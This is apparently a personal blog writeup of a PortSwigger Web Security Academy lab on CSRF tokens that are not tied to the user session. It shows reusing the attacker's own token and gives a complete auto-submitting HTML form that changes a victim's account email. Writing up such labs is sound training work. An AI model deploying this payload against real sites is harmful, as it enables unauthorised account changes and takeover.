+++
date = '2026-06-04T14:06:16+08:00'
draft = false
title = "CSRF where token is not tied to user session | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++
We first try changing the email of our own account. By intercepting the POST request in Burp, we can get the CSRF token for that request as below:
![](/images/15137e91-c5f3-402a-a281-430e6b078724.jpg)

Suppose we are blind about the vulnerability, we *try* to apply that same token in our payload to see whether the web server draws from a common token pool or not. *Surprisingly*, our payload works and is something like below:
```html
<html>
<body>

<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST" id="attack">
<input type="hidden" name="email" value="super-ultimate-hacker@leet-hacker.net">
<input type="hidden" name="csrf" value="<csrf-token>">
</form>

<script>
document.getElementById("attack").submit();
</script>

</body>
</html>
```